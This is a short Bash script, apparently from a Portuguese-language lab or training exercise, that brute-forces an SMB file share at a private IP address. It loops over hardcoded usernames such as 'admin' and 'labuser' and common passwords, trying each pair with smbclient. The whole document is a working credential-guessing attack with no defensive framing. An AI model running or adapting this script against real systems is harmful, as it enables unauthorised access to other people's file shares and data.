users=( "admin" "administrador" "teste" "labuser" "user" )

password=( "senha" "password" "sennha@123" "EasierPassword@123" "admin@123" )

for u in "${users[@]}";do
   for p in "${password[@]}";do
       echo "testando $u - $p"
       smbclient //172.25.223.247/smbshare -m SMB3 -U "${u}%${p}"
       echo "------------------------------------------------------------"
   done
done
